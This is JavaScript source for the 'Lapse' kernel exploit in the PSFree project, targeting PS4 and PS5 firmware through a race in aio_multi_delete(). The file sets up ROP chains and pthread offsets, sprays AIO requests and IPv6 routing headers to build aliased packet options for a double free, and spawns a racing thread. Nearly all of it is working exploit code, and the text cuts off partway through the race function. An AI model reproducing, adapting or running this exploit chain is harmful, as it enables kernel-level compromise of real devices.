/* Copyright (C) 2025 anonymous
This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

import { Int } from './module/int64.mjs';
import { mem } from './module/mem.mjs';
import { log, die, hex, hexdump } from './module/utils.mjs';
import { cstr, jstr } from './module/memtools.mjs';
import { page_size, context_size } from './module/offset.mjs';
import { Chain } from './module/chain.mjs';

import {
    View1, View2, View4,
    Word, Long, Pointer,
    Buffer,
} from './module/view.mjs';

import * as rop from './module/chain.mjs';
import * as config from './config.mjs';

const t1 = performance.now();

// check if we are running on a supported firmware version
const [is_ps4, version] = (() => {
    const value = config.target;
    const is_ps4 = (value & 0x10000) === 0;
    const version = value & 0xffff;
    const [lower, upper] = (() => {
        if (is_ps4) {
            return [0x100, 0x1250];
        } else {
            return [0x100, 0x1020];
        }
    })();

    if (!(lower <= version && version < upper)) {
        throw RangeError(`invalid config.target: ${hex(value)}`);
    }

    return [is_ps4, version];
})();

// sys/socket.h
const AF_UNIX = 1;
const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const SOL_SOCKET = 0xffff;
const SO_REUSEADDR = 4;
const SO_LINGER = 0x80;

// netinet/in.h
const IPPROTO_TCP = 6;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;

// netinet/tcp.h
const TCP_INFO = 0x20;
const size_tcp_info = 0xec;

// netinet/tcp_fsm.h
const TCPS_ESTABLISHED = 4;

// netinet6/in6.h
const IPV6_2292PKTOPTIONS = 25;
const IPV6_PKTINFO = 46;
const IPV6_NEXTHOP = 48;
const IPV6_RTHDR = 51;
const IPV6_TCLASS = 61;

// sys/cpuset.h
const CPU_LEVEL_WHICH = 3;
const CPU_WHICH_TID = 1;

// sys/mman.h
const MAP_SHARED = 1;
const MAP_FIXED = 0x10;

// sys/rtprio.h
const RTP_SET = 1;
const RTP_PRIO_REALTIME = 2;

// SceAIO has 2 SceFsstAIO workers for each SceAIO Parameter. each Parameter
// has 3 queue groups: 4 main queues, 4 wait queues, and one unused queue
// group. queue 0 of each group is currently unused. queue 1 has the lowest
// priority and queue 3 has the highest
//
// the SceFsstAIO workers will process entries at the main queues. they will
// refill the main queues from the corresponding wait queues each time they
// dequeue a request (e.g. fill the  low priority main queue from the low
// priority wait queue)
//
// entries on the wait queue will always have a 0 ticket number. they will
// get assigned a nonzero ticket number once they get put on the main queue
const AIO_CMD_READ = 1;
const AIO_CMD_WRITE = 2;
const AIO_CMD_FLAG_MULTI = 0x1000;
const AIO_CMD_MULTI_READ = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
const AIO_STATE_COMPLETE = 3;
const AIO_STATE_ABORTED = 4;
const num_workers = 2;
// max number of requests that can be created/polled/canceled/deleted/waited
const max_aio_ids = 0x80;

// highest priority we can achieve given our credentials
const rtprio = View2.of(RTP_PRIO_REALTIME, 0x100);

// CONFIG CONSTANTS
const main_core = 7;
const num_grooms = 0x200;
const num_handles = 0x100;
const num_sds = 0x100; // استعادة القيمة الأصلية
const num_alias = 50; // استعادة القيمة الأصلية
const num_races = 100;
const leak_len = 16;
const num_leaks = 5;
const num_clobbers = 8;

let chain = null;
var nogc = [];
async function init() {
    await rop.init();
    chain = new Chain();

// PS4 9.00
const pthread_offsets = new Map(Object.entries({
    'pthread_create' : 0x25510,
    'pthread_join' : 0xafa0,
    'pthread_barrier_init' : 0x273d0,
    'pthread_barrier_wait' : 0xa320,
    'pthread_barrier_destroy' : 0xfea0,
    'pthread_exit' : 0x77a0,
}));

    rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
}

function sys_void(...args) {
    return chain.syscall_void(...args);
}

function sysi(...args) {
    return chain.sysi(...args);
}

function call_nze(...args) {
    const res = chain.call_int(...args);
    if (res !== 0) {
        die(`call(${args[0]}) returned nonzero: ${res}`);
    }
}

// #define SCE_KERNEL_AIO_STATE_NOTIFIED       0x10000
//
// #define SCE_KERNEL_AIO_STATE_SUBMITTED      1
// #define SCE_KERNEL_AIO_STATE_PROCESSING     2
// #define SCE_KERNEL_AIO_STATE_COMPLETED      3
// #define SCE_KERNEL_AIO_STATE_ABORTED        4
//
// typedef struct SceKernelAioResult {
//     // errno / SCE error code / number of bytes processed
//     int64_t returnValue;
//     // SCE_KERNEL_AIO_STATE_*
//     uint32_t state;
// } SceKernelAioResult;
//
// typedef struct SceKernelAioRWRequest {
//     off_t offset;
//     size_t nbyte;
//     void *buf;
//     struct SceKernelAioResult *result;
//     int fd;
// } SceKernelAioRWRequest;
//
// typedef int SceKernelAioSubmitId;
//
// // SceAIO submit commands
// #define SCE_KERNEL_AIO_CMD_READ     0x001
// #define SCE_KERNEL_AIO_CMD_WRITE    0x002
// #define SCE_KERNEL_AIO_CMD_MASK     0xfff
// // SceAIO submit command flags
// #define SCE_KERNEL_AIO_CMD_MULTI 0x1000
//
// #define SCE_KERNEL_AIO_PRIORITY_LOW     1
// #define SCE_KERNEL_AIO_PRIORITY_MID     2
// #define SCE_KERNEL_AIO_PRIORITY_HIGH    3
//
// int
// aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, requests, num_requests, handles) {
    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}

// the various SceAIO syscalls that copies out errors/states will not check if
// the address is NULL and will return EFAULT. this dummy buffer will serve as
// the default argument so users don't need to specify one
const _aio_errors = new View4(max_aio_ids);
const _aio_errors_p = _aio_errors.addr;

// int
// aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_delete', ids, num_ids, sce_errs);
}

// int
// aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_poll', ids, num_ids, sce_errs);
}

// int
// aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}

// // wait for all (AND) or atleast one (OR) to finish
// // DEFAULT is the same as AND
// #define SCE_KERNEL_AIO_WAIT_DEFAULT 0x00
// #define SCE_KERNEL_AIO_WAIT_AND     0x01
// #define SCE_KERNEL_AIO_WAIT_OR      0x02
//
// int
// aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     // SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, sce_errs=_aio_errors_p) {
    sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
    const reqs1 = new Buffer(0x28 * num_reqs);
    for (let i = 0; i < num_reqs; i++) {
        // .fd = -1
        reqs1.write32(0x20 + i*0x28, -1);
    }
    return reqs1;
}

function spray_aio(
    loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ,
) {
    const step = 4 * (multi ? num_reqs : 1);
    cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
    for (let i = 0, idx = 0; i < loops; i++) {
        aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
        idx += step;
    }
}

function poll_aio(ids, states, num_ids=ids.length) {
    if (states !== undefined) {
        states = states.addr;
    }
    aio_multi_poll(ids.addr, num_ids, states);
}

function cancel_aios(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        aio_multi_cancel(ids_p.add((bi << 2) * len), len);
    }
    if (rem) {
        aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
    }
}

function free_aios(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        const addr = ids_p.add((bi << 2) * len);
        aio_multi_cancel(addr, len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
    if (rem) {
        const addr = ids_p.add((num_batches << 2) * len);
        aio_multi_cancel(addr, len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
}

function free_aios2(ids_p, num_ids) {
    const len = max_aio_ids;
    const rem = num_ids % len;
    const num_batches = (num_ids - rem) / len;
    for (let bi = 0; bi < num_batches; bi++) {
        const addr = ids_p.add((bi << 2) * len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
    if (rem) {
        const addr = ids_p.add((num_batches << 2) * len);
        aio_multi_poll(addr, len);
        aio_multi_delete(addr, len);
    }
}

function get_our_affinity(mask) {
    sysi(
        'cpuset_getaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        mask.addr,
    );
}

function set_our_affinity(mask) {
    sysi(
        'cpuset_setaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        mask.addr,
    );
}

function close(fd) {
    sysi('close', fd);
}

function new_socket() {
    return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
    return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
    const size = new Word(optval.size);
    if (optlen !== undefined) {
        size[0] = optlen;
    }

    sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
    return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
    sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
    if (optlen === undefined) {
        optlen = optval.size;
    }

    const addr = optval.addr;
    setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
    return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
    ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
    for (const sd of sds) {
        setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
    }
}

function build_rthdr(buf, size) {
    const len = ((size >> 3) - 1) & ~1;
    size = (len + 1) << 3;

    buf[0] = 0;
    buf[1] = len;
    buf[2] = 0;
    buf[3] = len >> 1;

    return size;
}

function spawn_thread(thread) {
    const ctx = new Buffer(context_size);
    const pthread = new Pointer();
    pthread.ctx = ctx;
    // pivot the pthread's stack pointer to our stack
    ctx.write64(0x38, thread.stack_addr);
    ctx.write64(0x80, thread.get_gadget('ret'));

    call_nze(
        'pthread_create',
        pthread.addr,
        0,
        chain.get_gadget('setcontext'),
        ctx.addr,
    );

    return pthread;
}

// EXPLOIT STAGES IMPLEMENTATION

// FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE

function make_aliased_pktopts(sds) {
    const marker_offset = 4;
    const size = 0x80;
    const buf = new Buffer(size);
    const rsize = build_rthdr(buf, size);

    for (let loop = 0; loop < num_alias; loop++) {
        for (let i = 0; i < num_sds; i++) {
            buf.write32(marker_offset, i);
            set_rthdr(sds[i], buf, rsize);
        }

        for (let i = 0; i < sds.length; i++) {
            get_rthdr(sds[i], buf);
            const marker = buf.read32(marker_offset);
            if (marker !== i) {
                log(`aliased rthdrs at attempt: ${loop}`);
                const pair = [sds[i], sds[marker]];
                log(`found pair: ${pair}`);
                sds.splice(marker, 1);
                sds.splice(i, 1);
                free_rthdrs(sds);
                sds.push(new_socket(), new_socket());
                return pair;
            }
        }
    }
    die(`failed to make aliased pktopts. size: ${hex(size)}`);
}

// summary of the bug at aio_multi_delete():
//
// void
// free_queue_entry(struct aio_entry *reqs2)
// {
//     if (reqs2->ar2_spinfo != NULL) {
//         printf(
//             "[0]%s() line=%d Warning !! split info is here\n",
//             __func__,
//             __LINE__
//         );
//     }
//     if (reqs2->ar2_file != NULL) {
//         // we can potentially delay .fo_close()
//         fdrop(reqs2->ar2_file, curthread);
//         reqs2->ar2_file = NULL;
//     }
//     free(reqs2, M_AIO_REQS2);
// }
//
// int
// _aio_multi_delete(
//     struct thread *td,
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[])
// {
//     // ...
//     struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//     // ...
//     u_int rem_ids = obj->ao_rem_ids;
//     if (rem_ids != 1) {
//         // BUG: wlock not acquired on this path
//         obj->ao_rem_ids = --rem_ids;
//         // ...
//         free_queue_entry(obj->ao_entries[req_idx]);
//         // the race can crash because of a NULL dereference since this path
//         // doesn't check if the array slot is NULL so we delay
//         // free_queue_entry()
//         obj->ao_entries[req_idx] = NULL;
//     } else {
//         // ...
//     }
//     // ...
// }
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
    const sce_errs = new View4([-1, -1]);
    const thr_mask = new Word(1 << main_core);

    const thr = racer;
    thr.push_syscall(
        'cpuset_setaffinity',
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        thr_mask.addr,
    );
    thr.push_syscall('rtprio_thread', RTP_SET, 0, rtprio.addr);
    thr.push_gadget('pop rax; ret');
    thr.push_value(1);
    thr.push_get_retval();
    thr.push_call('pthread_barrier_wait', barrier.addr);
    thr.push_syscall(
        'aio_multi_delete',
        request_addr,
        1,
        sce_errs.addr_at(1),
    );
    thr.push_call('pthread_exit', 0);

    const pthr = spawn_thread(thr);
    const thr_tid = pthr.read32(0);

    // pthread barrier implementation:
    //
    // given a barrier that needs N threads for it to be unlocked, a thread
    // will sleep if it waits on the barrier and N - 1 threads havent't arrived
    // before
    //
    // if there were already N - 1 threads then that thread (last waiter) won't
    // sleep and it will send out a wake-up call to the waiting threads
    //
    // since the ps4's cores only have 1 hardware thread each, we can pin 2
    // threads on the same core and control the interleaving of their
    // executions via controlled context switches

    // wait for the worker to enter the barrier and sleep
    while (thr.retval_int === 0) {
        sys_void('sched_yield');
  
(Content truncated due to size limit. Use line ranges to read in chunks)